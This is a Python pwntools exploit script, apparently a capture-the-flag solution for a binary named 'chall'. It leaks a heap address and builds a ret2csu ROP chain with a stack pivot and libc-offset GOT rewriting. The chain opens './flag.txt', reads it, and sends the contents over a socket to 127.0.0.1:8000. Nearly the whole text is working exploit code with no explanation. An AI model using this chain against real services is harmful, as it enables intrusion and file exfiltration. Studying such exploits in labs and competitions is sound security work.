from pwn import *
# http://shell-storm.org/shellcode/files/shellcode-207.php
elf = ELF("./chall")
r = process("./chall")
#r = remote("172.17.0.1",40801)
# r = remote("localhost", 40801)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
rop = ROP(elf)
context(arch="amd64",os="linux")
context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]
break_cmd = """
b *0x0000000000401426
b *0x000000000040143e
b *0x0000000000401452
"""
break_cmd = """
b *0x4014d9
"""
#gdb.attach(r)
#gdb.attach(r,break_cmd)
r.recvuntil(" [")
heap_loc = int(r.recvuntil("]",drop=True),16)
print(hex(heap_loc))
"""
  401490:       f3 0f 1e fa             endbr64
  401494:       41 57                   push   r15
  401496:       4c 8d 3d c3 28 00 00    lea    r15,[rip+0x28c3]        # 403d60 <__frame_dummy_init_array_entry>
  40149d:       41 56                   push   r14
  40149f:       49 89 d6                mov    r14,rdx
  4014a2:       41 55                   push   r13
  4014a4:       49 89 f5                mov    r13,rsi
  4014a7:       41 54                   push   r12
  4014a9:       41 89 fc                mov    r12d,edi
  4014ac:       55                      push   rbp
  4014ad:       48 8d 2d b4 28 00 00    lea    rbp,[rip+0x28b4]        # 403d68 <__do_global_dtors_aux_fini_array_entry>
  4014b4:       53                      push   rbx

"""
def add_value(addr,data):
    add_gadget = 0x000000000040129c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    pop_gadget = 0x4014ea # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15;

    payload = b""
    payload += p64(pop_gadget)
    payload += p64(data) # rbx
    payload += p64(addr + 0x3d) # rbp
    payload += p64(0xdeadbeef) * 4 # r12 r13 r14 r15
    payload += p64(add_gadget)
    return payload

def ret2csu(func,edi,rsi,rdx,pop=True):
    """
  4014d0:       4c 89 f2                mov    rdx,r14
  4014d3:       4c 89 ee                mov    rsi,r13
  4014d6:       44 89 e7                mov    edi,r12d
  4014d9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4014dd:       48 83 c3 01             add    rbx,0x1
  4014e1:       48 39 dd                cmp    rbp,rbx
  4014e4:       75 ea                   jne    4014d0 <__libc_csu_init+0x40>
  4014e6:       48 83 c4 08             add    rsp,0x8
  4014ea:       5b                      pop    rbx
  4014eb:       5d                      pop    rbp
  4014ec:       41 5c                   pop    r12
  4014ee:       41 5d                   pop    r13
  4014f0:       41 5e                   pop    r14
  4014f2:       41 5f                   pop    r15
  4014f4:       c3                      ret

    """
    mov_gadget = 0x4014d0
    pop_gadget = 0x4014ea

    payload = b""
    if pop:
        payload += p64(pop_gadget)
    payload += p64(0) # rbx
    payload += p64(1) # rbp
    payload += p64(edi) # r12 = edi
    payload += p64(rsi) # r13 = rsi
    payload += p64(rdx) # r14 = rsi
    payload += p64(func) # r15 = func
    payload += p64(mov_gadget)
    payload += p64(0xdeadbeef)
    return payload

pop_rsp = 0x00000000004014ed # pop rsp; pop r13; pop r14; pop r15; ret;
pop_rbp = 0x000000000040129d #: pop rbp; ret
leave_ret = 0x0000000000401379
add_rsp_8 = 0x0000000000401016
ip = b"\x02\x00\x1f@\x12\xd9m\xda".ljust(0x10,b"\x00") # 127.0.0.1 8000
filename = b"./flag.txt".ljust(0x20,b"\x00")

fake_chunk = p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
rop_pivot = [pop_rbp, heap_loc + len(fake_chunk) + len(ip) + len(filename)+(48*3)+0x38,leave_ret]
new_got = heap_loc + 416
print(hex(new_got))
"""
construct fake heap and ROP
"""
getdents = False

payload = b""
payload += fake_chunk
payload += ip + filename

inc = 0
for gadget in rop_pivot:
    payload += add_value(0x404038+inc,gadget)
    inc += 8
payload += p64(pop_rsp) + p64(0x404020)
"""
pivot ketiga di heap
"""
for x in range(0x10):
    payload += p64(add_rsp_8)
payload += p64(0x401494) # push r13 which contains libc address _IO_2_1_stdin_ to heap
payload += add_value(new_got,(libc.symbols['open'] - libc.symbols['_IO_2_1_stdin_']) & 0xffffffff) # offset from socket to _IO_2_1_stdin_
payload += ret2csu(new_got,heap_loc+len(fake_chunk)+len(ip),0,0) # open(filename,0,0)
payload += b"B" * 8 * 6 # padding
if getdents:
    payload += add_value(new_got,(libc.symbols['getdents64'] - libc.symbols['open']) & 0xffffffff)
    payload += ret2csu(new_got,0,elf.bss()+0x100,0x500)
    payload += b"A" * 8 * 6
    payload += add_value(new_got,(libc.symbols['socket'] - libc.symbols['getdents64']) & 0xffffffff )
else:
    payload += add_value(new_got,(libc.symbols['read'] - libc.symbols['open']) & 0xffffffff) # offset from open to read
    payload += ret2csu(new_got,0,elf.bss()+0x100,0x500) # read(fd,bss,0x100)
    payload += b"C" * 8 * 6 # padding
    payload += add_value(new_got,(libc.symbols['socket'] - libc.symbols['read']) & 0xffffffff) # offset from read to socket

payload += ret2csu(new_got,2,1,0) # socket(2,1,0)
payload += b"D" * 8 * 6 # padding
payload += add_value(new_got,(libc.symbols['connect'] - libc.symbols['socket']) & 0xffffffff)
payload += ret2csu(new_got,1,heap_loc+len(fake_chunk),0x10) # connect(fd,ip,0x10)
payload += b"D" * 8 * 6
payload += add_value(new_got,(libc.symbols['write'] - libc.symbols['connect']) & 0xffffffff)
payload += ret2csu(new_got,1,elf.bss()+0x100,0x500) # write()


r.sendlineafter("[?] Advice",payload)

payload = b"A" * 24 + p64(heap_loc + 0x10) + p64(heap_loc + len(fake_chunk) + len(ip) + len(filename) - 0x8) + p64(leave_ret)
#payload = b"A" * 24 + p64(0) + p64(0xdeadbeef) + p64(0xdedeb0b0)
r.sendlineafter("[?] Team Name",payload)

r.interactive()
